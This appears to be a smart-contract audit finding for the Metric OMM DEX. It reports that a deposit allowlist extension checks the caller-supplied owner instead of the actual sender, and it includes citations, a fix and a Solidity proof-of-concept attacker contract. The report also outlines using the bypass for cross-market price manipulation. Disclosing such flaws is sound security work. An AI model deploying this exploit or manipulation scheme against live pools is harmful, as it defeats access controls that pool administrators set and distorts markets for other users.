### Title
`DepositAllowlistExtension` Checks `owner` Instead of `sender`, Allowing Unauthorized Callers to Bypass the Deposit Allowlist — (`File: metric-periphery/contracts/extensions/DepositAllowlistExtension.sol`)

---

### Summary

`DepositAllowlistExtension.beforeAddLiquidity` silently drops the `sender` argument and gates only on `owner`. Because `addLiquidity` lets the caller freely choose any `owner` address, any unprivileged address can satisfy the allowlist check by naming an already-authorized owner, then pay tokens into the pool via the callback. The position is irrevocably owned by the named address, but the pool's liquidity distribution is altered by an actor the pool admin explicitly excluded.

---

### Finding Description

`MetricOmmPool.addLiquidity` passes two distinct addresses to the extension hook:

```
_beforeAddLiquidity(msg.sender, owner, salt, deltas, extensionData);
```

- `sender` = `msg.sender` — the actual caller who will pay tokens through the callback.
- `owner` = caller-supplied parameter — the address that will own the resulting position.

`DepositAllowlistExtension.beforeAddLiquidity` receives both but ignores `sender` entirely:

```solidity
function beforeAddLiquidity(address, address owner, uint80, LiquidityDelta calldata, bytes calldata)
    external view override returns (bytes4)
{
    if (!allowAllDepositors[msg.sender] && !allowedDepositor[msg.sender][owner]) {
        revert IMetricOmmPoolActions.NotAllowedToDeposit();
    }
    return IMetricOmmExtensions.beforeAddLiquidity.selector;
}
```

The check is `allowedDepositor[pool][owner]`. An attacker who is **not** on the allowlist simply calls `addLiquidity(owner = any_authorized_address, ...)`. The extension sees an authorized `owner`, passes the check, and the pool proceeds to pull tokens from the attacker via the callback and mint a position for the named owner.

The parallel `SwapAllowlistExtension` correctly checks `sender` (the actual caller of `swap`), confirming the asymmetry is unintentional:

```solidity
// SwapAllowlistExtension — checks sender ✓
if (!allowAllSwappers[msg.sender] && !allowedSwapper[msg.sender][sender]) {
    revert IMetricOmmPoolActions.NotAllowedToSwap();
}
```

`removeLiquidity` enforces `msg.sender == owner`, so the attacker cannot reclaim the deposited tokens — they are permanently transferred to the named owner. The attacker's only gain is the ability to alter the pool's bin liquidity distribution without authorization.

---

### Impact Explanation

A pool admin who deploys `DepositAllowlistExtension` intends to restrict which addresses may provide liquidity (e.g., for regulatory compliance, to prevent adversarial LPs, or to control pool depth). The bypass lets any unprivileged address:

1. Add arbitrary liquidity to any bin, shifting the pool's depth profile and effective bid/ask spread for all subsequent swaps.
2. Force a position onto an authorized LP address without that LP's consent, potentially triggering downstream effects (e.g., `OracleValueStopLossExtension` watermark updates on bins the authorized LP never intended to touch).
3. Conduct cross-market manipulation: deposit liquidity to move the pool's marginal price, profit via an external derivative position, and accept the token cost as the manipulation fee — the tokens are irrecoverably gifted to the named owner.

The allowlist access-control invariant is broken for every pool that configures this extension.

---

### Likelihood Explanation

- The bypass requires no special privilege: any EOA or contract can call `addLiquidity` on a pool.
- The only prerequisite is knowing one authorized owner address, which is discoverable on-chain from past `addLiquidity` transactions or from the extension's `allowedDepositor` mapping.
- The attacker must supply real tokens, but those tokens are not lost to the protocol — they are credited to the named owner, making the attack economically rational whenever the manipulation value exceeds the token cost.

---

### Recommendation

Replace the ignored first parameter with a named `sender` and gate on it, mirroring `SwapAllowlistExtension`:

```solidity
function beforeAddLiquidity(address sender, address, uint80, LiquidityDelta calldata, bytes calldata)
    external view override returns (bytes4)
{
    if (!allowAllDepositors[msg.sender] && !allowedDepositor[msg.sender][sender]) {
        revert IMetricOmmPoolActions.NotAllowedToDeposit();
    }
    return IMetricOmmExtensions.beforeAddLiquidity.selector;
}
```

If the intent is to gate on the position owner (who will hold the LP shares), keep the `owner` check but add an explicit `sender` check as well, so both the caller and the beneficiary must be authorized.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

// Assume pool is deployed with DepositAllowlistExtension.
// authorizedLP is on the allowlist; attacker is not.

contract AttackerRouter is IMetricOmmModifyLiquidityCallback {
    IMetricOmmPool pool;
    IERC20 token0;
    IERC20 token1;

    constructor(address pool_, address t0, address t1) {
        pool = IMetricOmmPool(pool_);
        token0 = IERC20(t0);
        token1 = IERC20(t1);
    }

    function exploit(address authorizedLP, LiquidityDelta calldata deltas) external {
        // Attacker is NOT on the allowlist, but authorizedLP IS.
        // The extension checks owner (authorizedLP) — passes.
        // Tokens are pulled from this contract (attacker) via callback.
        pool.addLiquidity(
            authorizedLP,   // owner = authorized address → passes allowlist check
            0,              // salt
            deltas,
            "",             // callbackData
            ""              // extensionData
        );
        // Pool now has attacker-supplied liquidity in the chosen bins.
        // authorizedLP owns the position; attacker cannot withdraw.
        // Pool's bin depth has been altered by an unauthorized actor.
    }

    function metricOmmModifyLiquidityCallback(
        int256 amount0Delta, int256 amount1Delta, bytes calldata
    ) external override {
        if (amount0Delta > 0) token0.transfer(msg.sender, uint256(amount0Delta));
        if (amount1Delta > 0) token1.transfer(msg.sender, uint256(amount1Delta));
    }
}
```

After `exploit` executes, `pool.position(id, authorizedLP)` shows non-zero shares the authorized LP never requested, and the pool's bin liquidity has been modified by an address the pool admin explicitly excluded from the allowlist. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3)

### Citations

**File:** metric-periphery/contracts/extensions/DepositAllowlistExtension.sol (L32-42)
```text
  function beforeAddLiquidity(address, address owner, uint80, LiquidityDelta calldata, bytes calldata)
    external
    view
    override
    returns (bytes4)
  {
    if (!allowAllDepositors[msg.sender] && !allowedDepositor[msg.sender][owner]) {
      revert IMetricOmmPoolActions.NotAllowedToDeposit();
    }
    return IMetricOmmExtensions.beforeAddLiquidity.selector;
  }
```

**File:** metric-core/contracts/MetricOmmPool.sol (L182-196)
```text
  function addLiquidity(
    address owner,
    uint80 salt,
    LiquidityDelta calldata deltas,
    bytes calldata callbackData,
    bytes calldata extensionData
  ) external nonReentrant(PoolActions.ADD_LIQUIDITY) returns (uint256 amount0Added, uint256 amount1Added) {
    if (deltas.binIdxs.length == 0) return (0, 0);
    if (deltas.binIdxs.length != deltas.shares.length) revert LiquidityDeltaLengthMismatch();
    _beforeAddLiquidity(msg.sender, owner, salt, deltas, extensionData);
    (amount0Added, amount1Added) = LiquidityLib.addLiquidity(
      _liquidityContext(), owner, salt, deltas, callbackData, binTotals, _binStates, _binTotalShares, _positionBinShares
    );
    _afterAddLiquidity(msg.sender, owner, salt, deltas, amount0Added, amount1Added, extensionData);
  }
```

**File:** metric-core/contracts/MetricOmmPool.sol (L199-212)
```text
  function removeLiquidity(address owner, uint80 salt, LiquidityDelta calldata deltas, bytes calldata extensionData)
    external
    nonReentrant(PoolActions.REMOVE_LIQUIDITY)
    returns (uint256 amount0Removed, uint256 amount1Removed)
  {
    if (deltas.binIdxs.length == 0) return (0, 0);
    if (deltas.binIdxs.length != deltas.shares.length) revert LiquidityDeltaLengthMismatch();
    if (msg.sender != owner) revert NotPositionOwner();
    _beforeRemoveLiquidity(msg.sender, owner, salt, deltas, extensionData);
    (amount0Removed, amount1Removed) = LiquidityLib.removeLiquidity(
      _liquidityContext(), owner, salt, deltas, binTotals, _binStates, _binTotalShares, _positionBinShares
    );
    _afterRemoveLiquidity(msg.sender, owner, salt, deltas, amount0Removed, amount1Removed, extensionData);
  }
```

**File:** metric-periphery/contracts/extensions/SwapAllowlistExtension.sol (L31-41)
```text
  function beforeSwap(address sender, address, bool, int128, uint128, uint256, uint128, uint128, bytes calldata)
    external
    view
    override
    returns (bytes4)
  {
    if (!allowAllSwappers[msg.sender] && !allowedSwapper[msg.sender][sender]) {
      revert IMetricOmmPoolActions.NotAllowedToSwap();
    }
    return IMetricOmmExtensions.beforeSwap.selector;
  }
```
